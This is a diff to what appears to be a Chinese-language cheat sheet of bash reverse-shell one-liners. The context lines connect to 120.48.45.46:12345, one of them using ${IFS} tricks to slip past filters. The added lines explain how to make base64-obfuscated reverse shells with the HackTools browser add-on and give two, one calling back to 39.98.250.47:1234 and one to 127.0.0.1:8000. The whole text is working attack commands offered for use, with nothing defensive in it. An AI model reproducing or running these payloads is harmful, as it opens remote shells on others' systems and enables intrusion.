@@ -79,3 +79,14 @@ bash -c 'exec bash -i &>/dev/tcp/120.48.45.46/12345 <&1'
 bash -c bash${IFS}-i${IFS}>&/dev/tcp/120.48.45.46/12345<&1
 ```
 参考链接：https://blog.csdn.net/whatday/article/details/107098353
+
+使用火狐浏览器插件HackTools生成base64编码后的反弹shell命令，替换下面的base64字符串
+```
+bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8zOS45OC4yNTAuNDcvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
+```
+
+```
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAwMCAwPiYx}|{base64,-d}|{bash,-i}
+
+其中 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAwMCAwPiYx 是 bash -i >& /dev/tcp/127.0.0.1/8000 0>&1 的base64编码
+```
